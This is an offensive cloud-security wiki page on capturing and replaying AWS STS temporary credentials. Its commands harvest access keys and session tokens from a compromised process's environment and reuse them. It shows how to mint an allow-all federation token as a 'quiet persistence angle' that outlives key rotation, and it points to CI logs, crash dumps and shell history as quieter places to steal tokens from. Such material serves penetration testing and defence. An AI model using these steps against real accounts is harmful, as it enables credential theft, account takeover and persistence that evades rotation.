---
title: "STS tokens: capturing and replaying temporary session credentials"
description: "Capturing and replaying short-lived STS session tokens (AccessKeyId, SecretAccessKey, SessionToken) lifted from processes, logs, and environment variables."
keywords:
  - STS
  - session token
  - temporary credentials
  - SessionToken
  - replay
---

# STS tokens

Temporary STS credentials are a triple: an `ASIA`-prefixed access key, a secret, and a **session token**, with an expiry. They are what roles, federation, and the metadata service hand out, and they are reusable from anywhere until they expire, so lifting them from a process, a log line, or an environment variable is often enough to continue as the principal.

## Capturing and replaying

```bash
# in a compromised process environment
env | grep -E 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)'

export AWS_ACCESS_KEY_ID=ASIA... \
       AWS_SECRET_ACCESS_KEY=... \
       AWS_SESSION_TOKEN=...
aws sts get-caller-identity           # confirm identity and that it is still valid
```

## Checking scope and lifetime

```bash
aws sts get-caller-identity           # the assumed-role ARN tells you what you are
# decode the token's expiry from the source that issued it (role max-session-duration)
```

## Minting and extending sessions

Holding a user's long-term key lets STS mint fresh sessions to use elsewhere:

```bash
# MFA-gated session, where a policy requires MFA for the actions you want
aws sts get-session-token --serial-number <mfa-arn> --token-code 123456

# a scoped session that also feeds a console URL; GetFederationToken
# sessions last up to 36 hours
aws sts get-federation-token --name op \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
```

`GetFederationToken` is a quiet persistence angle: the triple it returns drives a console sign-in URL (see [credential brokers](credential-brokers.md)) and keeps working after the originating key is rotated, for the life of the token.

## Exploitation notes

- When an API call is denied with an encoded authorization message, `aws sts decode-authorization-message --encoded-message <msg>` reveals the exact failed action and policy context, mapping the principal's boundary fast.
- `ASIA` keys without the session token are useless; always grab all three.
- Tokens from role chaining are capped at one hour; tokens from a direct assume can last up to the role's max session duration.
- Session credentials often appear in CI logs, crash dumps, and shell history, which are quieter sources than live memory.

## Tools

- **AWS CLI** (`sts get-caller-identity`, `get-session-token`, `get-federation-token`, `decode-authorization-message`).
- **aws_consoler** (NetSPI): convert a session triple into a console sign-in URL.
- **Pacu**: import session credentials and continue enumeration.

## References

- [AWS: temporary security credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html)
- [HackTricks Cloud: STS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-sts-privesc.html)
- [aws_consoler (NetSPI)](https://github.com/NetSPI/aws_consoler)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
